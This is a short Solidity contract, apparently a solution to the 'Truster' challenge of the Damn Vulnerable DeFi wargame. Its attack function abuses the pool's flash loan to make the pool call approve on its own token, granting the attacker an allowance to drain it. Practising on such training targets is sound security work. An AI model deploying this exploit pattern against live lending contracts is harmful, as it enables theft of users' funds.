// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {console} from "../Console.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface ITrusterLenderPool{
    function flashLoan(uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data) external ;
}

contract AttackTruster is ReentrancyGuard {

    using Address for address;

    address public damnValuableToken;
    address public pool;
    
    constructor (address _pool, address _tokenAddress) {
        damnValuableToken = _tokenAddress;
        pool = _pool;
    }

    function attack(uint256 amt, address attacker, uint256 approveAmt)
        external
    {
        ITrusterLenderPool(pool).flashLoan(amt, attacker, damnValuableToken, 
            abi.encodeWithSignature("approve(address,uint256)",attacker,approveAmt)
        );
        
        
    }

}
